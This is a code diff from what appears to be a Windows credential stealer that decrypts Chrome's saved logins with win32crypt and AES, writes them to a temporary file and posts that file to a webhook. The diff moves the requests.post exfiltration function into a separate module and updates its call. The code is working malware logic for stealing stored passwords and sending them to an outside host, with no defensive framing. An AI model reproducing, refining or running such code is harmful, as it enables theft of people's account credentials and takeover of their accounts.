@@ -6,6 +6,7 @@ import time
 import base64
 import sqlite3
 import win32crypt
+from upload import upload
 from getpass import getuser
 from Cryptodome.Cipher import AES
 import shutil
@@ -74,10 +75,6 @@ def get_db_connection(chrome_path_login_db):
         print("[ERR] Chrome database cannot be found")
         return None
 
-def upload(file_path):
-    with open(file_path, "rb") as file:
-        response = requests.post(webhook, files={"file": file})
-
 if __name__ == '__main__':
     try:
         secret_key = get_secret_key()
@@ -102,7 +99,7 @@ if __name__ == '__main__':
                 os.remove("Loginvault.db")
         temp_file.close()
         info.main()
-        upload(tmpfile)
+        upload(webhook,tmpfile)
         os.remove(tmpfile)
     except IOError as e:
         print("[ERR] %s"%str(e))
